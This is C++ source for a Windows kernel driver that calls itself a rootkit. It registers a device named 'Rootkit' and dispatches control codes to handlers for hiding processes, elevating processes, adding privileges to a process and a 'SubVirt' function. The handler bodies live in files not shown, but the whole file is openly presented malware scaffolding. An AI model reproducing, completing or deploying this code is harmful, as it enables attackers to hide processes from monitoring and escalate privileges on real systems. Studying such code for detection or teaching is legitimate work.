#include<wdm.h>
#include "ioctls.h"
#include "ioctl_handles.h"

UNICODE_STRING G_DEVICE_NAME;
UNICODE_STRING G_SYMBOLIC_NAME;

NTSTATUS RootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);

static VOID UnloadRootkit(_In_ PDRIVER_OBJECT pDriverObject) {

	IoDeleteSymbolicLink(&G_SYMBOLIC_NAME);
	IoDeleteDevice(pDriverObject->DeviceObject);

	DbgPrintEx(0, 0, "Rootkit service stopped...Driver Unloaded\n");

}

static NTSTATUS DispatchRoutine(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP pIrp) {

	UNREFERENCED_PARAMETER(pDeviceObject);
	NTSTATUS status = STATUS_SUCCESS;

	PIO_STACK_LOCATION pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	ULONG controlCode = pIoStackLocation->Parameters.DeviceIoControl.IoControlCode;

	switch (controlCode) {
	case (ULONG)IOCTls::Hide:
		KdPrint(("Hide Process IOCTL recieved\n"));
		status = IoctlHandlers::HandleHideProcess(pIrp);
		break;

	case (ULONG)IOCTls::Elevate:
		KdPrint(("Elevate Process IOCTL recieved\n"));
		status = IoctlHandlers::HandleElevate(pIrp);
		break;
	case (ULONG)IOCTls::TestConnection:
		DbgPrint("Test Connection IOCTL recieved\n");
		status = IoctlHandlers::HandleTestConnection(pIrp, pIoStackLocation->Parameters.DeviceIoControl.OutputBufferLength);
		break;
	case (ULONG)IOCTls::SubVirt:
		KdPrint(("SubVirt Process IOCTL recieved\n"));
		status = IoctlHandlers::HandleSubvirt(pIrp);
		break;
	case (ULONG)IOCTls::AddPrivs:
		KdPrint(("Add Privileges IOCTL recieved\n"));
		status = IoctlHandlers::AddPrivsToProcess(pIrp);
		break;
	default:
		KdPrint(("Invalid IOCTL recieved!\n"));
		status = STATUS_INVALID_PARAMETER;
		break;
	}

	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;

}

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT pDriverObject, _In_ PUNICODE_STRING pRegistryPath) {

	UNREFERENCED_PARAMETER(pRegistryPath);
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT pDeviceObject;

	RtlInitUnicodeString(&G_DEVICE_NAME, L"\\Device\\Rootkit");
	RtlInitUnicodeString(&G_SYMBOLIC_NAME, L"\\??\\Rootkit");

	pDriverObject->DriverUnload = UnloadRootkit;

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = RootkitCreateClose;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = RootkitCreateClose;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchRoutine;

	status = IoCreateDevice(pDriverObject, 0, &G_DEVICE_NAME, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObject);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0 ,0 ,"IoCreateDevice failed: 0x%X\n", status);
		return status;
	}

	status = IoCreateSymbolicLink(&G_SYMBOLIC_NAME, &G_DEVICE_NAME);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0,0, "IoCreateSymbolicLink failed: 0x%X\n", status);
		IoDeleteDevice(pDeviceObject);
		return status;
	}

	DbgPrintEx(0, 0, "Rootkit service started...Driver Loaded\n");

	return status;

}

NTSTATUS RootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}
